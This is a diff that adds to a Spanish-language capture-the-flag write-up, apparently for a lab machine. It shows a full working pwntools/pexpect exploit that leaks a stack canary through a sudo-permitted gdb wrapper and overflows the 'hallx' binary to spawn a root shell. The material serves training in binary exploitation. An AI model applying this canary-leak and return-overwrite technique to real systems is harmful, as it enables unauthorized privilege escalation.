@@ -789,9 +789,263 @@ este usuario no tiene permisos asignados pero tras chequear las conversaciones d
 
 ![image](https://github.com/user-attachments/assets/979bb979-10cb-4032-8cef-5dcdeb16b0ce)
 
-... El final lo termino cuando alguien consigo la flag de root 😊
+solicitamos los permisos:
+
+```
+echo -e 'Nombre del solicitante: pedro\nFecha: 07-05-2025\nmensaje: Solicitud de Permisos en GDB\nBreve descripcion: numero de caso: 000-0923' | exim root@cybersec
+```
+
+![image](https://github.com/user-attachments/assets/97847d5a-8e98-4113-836d-e3717cf2cc0d)
+
+vemos que nos da permisos de ejecutar como root el script `/usr/local/bin/secure_gdb`, veamos de que va el script
 
 
+`/usr/local/bin/secure_gdb`
+
+```bash
+#!/bin/bash
+# script que le otorga permisos al usuario pedro para que ejecute unica y exclusivamente el binario en su directorio
+bin_path="/home/pedro/hallx"
+hash="183480399567de77e64a64c571bcfe7ccc0c5f67830300ac8f9b6fa6990bfc26"
+
+if [[ $# -ne 1 ]]; then
+    echo "Error: Only one argument is allowed (the path to the binary >> $bin_path)."
+    exit 1
+fi
+
+if [[ "$1" != $bin_path ]]; then
+    echo "Permission denied: You can only debug the binary $bin_path"
+    exit 1
+fi
+
+validator=$(sha256sum "$1" |awk '{print $1}')
+
+if [[ "$hash" != "$validator" ]]; then
+   echo "Modified binary, aborting execution"
+   echo "Notifying System Administrator of Event!"
+   echo "Binary modification detected $bin_path" >> /root/Events.log
+   sleep 2
+   echo "Notification Sent"
+   exit 1
+fi
+
+/usr/bin/gdb -nx -x /root/.gdbinit "$@"
+```
+
+aqui vemos que el script se encarga de ejecutar el binario `/home/pedro/hallx` pero realizando algunas comprobaciones de seguridad como: 1) solo se permite depurar un unico binario (/home/pedro/hallx), validacion de hash con el fin de evitar que se suplante el binario por otro y tambien se observa que se usa un archivo de configuracion '/root/.gdbinit' (debe tener mas restricciones).
+
+vamos a ir testeando
+
+```bash
+sudo /usr/local/bin/secure_gdb /home/pedro/hallx
+```
+
+![image](https://github.com/user-attachments/assets/e27f2663-48f6-4c17-8578-ec376356616d)
+
+vemos que no es posible la ejecucion de comandos, han bloqueado esta funcionalidad... por ahora salgo del depurador y reviso el directorio `analisis_hallx` donde encuentro archivos en relacion al binario
+
+![image](https://github.com/user-attachments/assets/617c0655-b4eb-46eb-a48d-c0644e1c62d6)
+
+por aqui vemos un analisis del binario, ya sabemos que tiene una vulnerabilidad `bof` y que contiene una funcion que invoca una `/bin/bash`. Lo que hare a continuacion sera pasar el binario a mi maquina atacante para realizar pruebas e intentar explotar dicha vulnerabilidad..
+
+![image](https://github.com/user-attachments/assets/bc3e3729-6c9e-4245-a9ba-d319bbb9b5ca)
+
+ahora comenzaremos a analizarlo
+
+![image](https://github.com/user-attachments/assets/790e6513-5df9-4aae-b8c1-611cb310e9ad)
+
+vemos que tiene las protecciones activas (CANARY, NX, PIE); esto complicaria de forma significativa la explotacion pero vamos a intentar dicha explotacion. Ahora vamos a testear el desbordamiento del buffer
+
+![image](https://github.com/user-attachments/assets/476f908a-5c67-4ffe-adcb-534e2c036e0d)
+
+aqui vemos como al corromper el stack salta la proteccion CANARY interrumpiendo la ejecucion del binario terminando de forma automatica. Vamos a realizar ingenieria inversa para entender un poco mas 
+el binario de forma interna
+
+![image](https://github.com/user-attachments/assets/c1d1861e-35a4-49d4-8511-5d10fa9bb4b9)
+
+aqui al analizar el binario con ghidra, ya vemos las funciones del informe que encontramos: `factor1 & factor2`. En cuanto a la funcion principal 'main', tambien podemos observar que se llaman 2 funciones al comienzo para detectar virtualizacion y depuracion, asi como la creacion de archivos de logs y por ultimo la ejecucion de la funcion `factor2`. Saltamos a la funcion `factor2` para su analisis
+
+![image](https://github.com/user-attachments/assets/8599529e-a99c-4094-9bde-10a5ae7c91d7)
+
+aqui tambien podemos ver donde ocurre el fallo de seguridad que conduce al bof: la funcion `fgets` esta implementada incorrectamente, se permite una lectura de `0x80` (128) bytes mientras que el buffer es de 72 bytes, Esto permite el desbordamiento de buffer... como nuestro objetivo es explotar la vulnerabilidad no es necesario entender todo el programa, sino solo las funciones de interes asi que ahora sabiendo esta informacion saltamos a la funcion `factor1` que segun el reporte dicha funcion llama a una `/bin/bash`
+
+![image](https://github.com/user-attachments/assets/7a60544d-4de8-44f5-922b-0d4cf14a1cb2)
+
+y aqui lo tenemos, en efecto se llama a una `/bin/bash`. Con toda esta informacion vamos a desarrollar un exploit que nos permita alcanzar la funcion `factor1` que lanza la `/bin/bash` pero para lograr esto debemos bypassear las protecciones del binario y teniendo en cuenta que el binario tiene el `CANARY` activo vamos a necesitar extraer todas la direcciones de memoria en tiempo de ejecucion.
+
+### Desarrollo del Exploit
+
+Primero vamos a necesitar localizar donde se encuentra el `CANARY` en memoria y para esto usaremos radare2 y gdb... Primero `radare2`
+
+```bash
+radare2 -e bin.relocs.apply=true hallx
+```
+
+![image](https://github.com/user-attachments/assets/10821105-ee57-4dd1-a8b1-6b89c35c0ee5)
+
+`radare2` nos muestra claramente `[CANARY]` 
+
+ahora con `gdb` podremos ver la direccion donde se encuentra en memoria
+
+```bash
+gdb -q ./hallx
+```
+![image](https://github.com/user-attachments/assets/edcb47f7-2aee-445c-92c1-a12f37b90ad0)
+
+al desensamblar la funcion `main` vemos que el canary se encuentra en `rbp -0x80`. Ahora vamos a crear un punto de interrupcion en `main` y despues corremos el binario
+
+![image](https://github.com/user-attachments/assets/c5dbf451-dd47-49dc-9f1c-6e409cbe88f0)
+
+volvemos a desensamblar la funcion `main` para localizar una direccion de memoria despues del canary y crear otro punto de interrupcion
+
+![image](https://github.com/user-attachments/assets/2b34701e-0534-41e5-b97f-4912e5fed647)
+
+como vemos, actualmente estamos detenidos en la direccion de memoria: 0x0000555555557762 y el canary se escribe en la pila en la direccion: 0x000055555555776f; por lo que vamos a crear el punto de interrupcion en la direccion de memoria: 0x0000555555557775, en este punto ya podremos extraer el valor del canary de la memoria
+
+![image](https://github.com/user-attachments/assets/c87eb085-f2d7-4269-8526-5ca961bbbe12)
+
+ahora extraemos el valor del canary ya que se encuentra cargada en el stack
+
+```bash
+x/1gx $rbp-0x8
+```
+```
+x/1gx $rbp-0x8
+x = para examinar memoria
+/1 = cantidad de elementos a mostrar
+g = tamano del dato a mostrar, en este caso 8 bytes
+x = formato del dato, en este caso hexadecimal
+$rbp-0x8 = direccion donde se encuentra el valor del Canary
+```
+
+![image](https://github.com/user-attachments/assets/b3a48f8a-d11c-4352-83d3-cd3ed7b34bfd)
+
+ya sabemos como extraer el valor del canary (los pasos que se han hecho aqui vamos a tener que automatizarlos en el exploit).
+
+Ahora vemos a localizar la direccion de memoria de la funcion `facto1`, esta si es mas facil
+
+```bash
+print factor1
+```
+
+![image](https://github.com/user-attachments/assets/a93a637f-e1aa-4b8c-b190-aa47183ce382)
+
+ahora vamos automatizar a traves de python la extraccion de la informacion y el envio del payload para obtener una `/bin/bash` al llamar a la funcion `factor1`
+
+```python
+import pexpect
+import re
+import struct
+from pwn import *
+
+def atack():
+
+    binary = ELF("/home/pedro/hallx")
+    binary_path = "/home/pedro/hallx"
+    secure_gdb = "/usr/local/bin/secure_gdb"
+    gdb_process = pexpect.spawn(f"sudo {secure_gdb} {binary_path}", timeout=10, maxread=10000, searchwindowsize=100)
+    gdb_process.expect("(gdb)")
+    gdb_process.sendline("set disassembly-flavor intel") # configurando el formato que usara gbd para desensamblar, en este caso el formato de intel
+    gdb_process.expect("(gdb)")
+    gdb_process.sendline("set pagination off") # desactivamos la paginacion de gdb y asi evitamos que nos pregunte si continuar cuando la salida es muy extensa
+    gdb_process.expect("(gdb)")
+    gdb_process.sendline("set style enabled off") # desactivamos los colores en la salida de gdb, ya que esto nos impide grepear para extraer informacion
+    gdb_process.expect("(gdb)")
+    gdb_process.sendline("break main")
+    gdb_process.expect("(gdb)")
+    #gdb_process.sendline("break factor1")
+    #gdb_process.expect("(gdb)")
+    gdb_process.sendline("run")
+
+    # Extraccion de la direccion de factor1
+    gdb_process.expect("(gdb)")
+    gdb_process.sendline("p factor1")
+    gdb_process.expect_exact("(gdb)", timeout=10)
+    address_factor1 = gdb_process.before.decode('utf-8')
+    match = re.search(r'0x[0-9a-f]+', address_factor1)
+    if match:
+       address_factor1_str = match.group(0)  # Extraer la dirección en formato hexadecimal
+       address_factor1_int = int(address_factor1_str, 16)
+       address_factor1_le = p64(address_factor1_int) # direccion de factor1 en formato little-endian lista para el payload
+       gdb_process.sendline(" ") # prepara gdb para recibir el siguiente comando!
+    else:
+       print("No se pudo extraer la dirección de factor1().")
+       exit(1)
+
+    # desensamble de la funcion factor2 y obtencion de una direccion de memoria para crear un punto de interrupcion y posteriormente extraer el canary
+    gdb_process.expect("(gdb)")
+    gdb_process.sendline("disas factor2")
+    gdb_process.expect_exact("(gdb)", timeout=10)
+    address_factor2 = gdb_process.before.decode('utf-8')
+    lines = address_factor2.splitlines()
+    memory_addresses = [line.split()[0] for line in lines if '<+' in line]
+    if len(memory_addresses) >= 7:
+       seventh_memory_address = memory_addresses[6]
+       gdb_process.sendline(" ")
+       gdb_process.expect("(gdb)")
+       gdb_process.sendline(f"break *{seventh_memory_address}")
+       gdb_process.expect("(gdb)")
+       gdb_process.sendline("continue")
+    else:
+       print("No hay suficientes direcciones de memoria en la salida")
+
+    # extraccion del canary
+    gdb_process.expect("(gdb)")
+    gdb_process.sendline("x/1gx $rbp-0x8")
+    gdb_process.expect_exact("(gdb)", timeout=10)
+    output_canary = gdb_process.before.decode('utf-8')
+    canary_value = output_canary.split(':')[1].strip().split()[0]
+    output_canary_int = int(canary_value, 16)
+    output_canary_le = struct.pack('<Q', output_canary_int) # canary listo en formato little-endian para el payload
+    gdb_process.sendline(" ")
+    gdb_process.expect("(gdb)")
+    gdb_process.sendline("continue")
+
+#    test code
+#    gdb_process.expect("(gdb)")
+#    gdb_process.sendline("disas factor2")
+#    gdb_process.expect_exact("(gdb)", timeout=10)
+#    address_breakpoint = gdb_process.before.decode('utf-8')
+#    lines = address_breakpoint.splitlines()
+#    memory_addresses_breakpoint = [line.split()[0] for line in lines if '<+' in line]
+#    if len(memory_addresses_breakpoint) >= 20:
+#       memory_address_bp = memory_addresses_breakpoint[19]
+#       gdb_process.sendline(" ")
+#       gdb_process.expect("(gdb)")
+#       gdb_process.sendline(f"break *{memory_address_bp}")
+#       gdb_process.expect("(gdb)")
+#       gdb_process.sendline("continue")
+#    else:
+#       print("No hay suficientes direcciones de memoria en la salida")
+
+    # construccion del payload
+    buffer_size = 72 # offset before overwriting the canary
+    buffer_fil = b'S' *buffer_size
+    padding = b'A' *8 # padding to align the stack
+    #rip = b'P' *8
+
+    payload = flat(
+    buffer_fil,
+    output_canary_le,
+    padding,
+    address_factor1_le
+    )
+    # envio del payload
+    gdb_process.expect("Introduce tu nombre: ")
+    gdb_process.sendline(payload)
+    #gdb_process.expect("(gdb)")
+    gdb_process.sendline("continue")
+    gdb_process.interact()
+    gdb_process.send(b"quit")
+    gdb_process.close()
+
+if __name__ == '__main__':
+    atack()
+```
+
+el desarrollo del exploit llevo mucho analisis de memoria y tiempo hasta que conseguimos obtener el resultado esperado!
+
+![image](https://github.com/user-attachments/assets/f38f84d8-ec5b-4727-9dda-2963e7d27298)
 
 
 
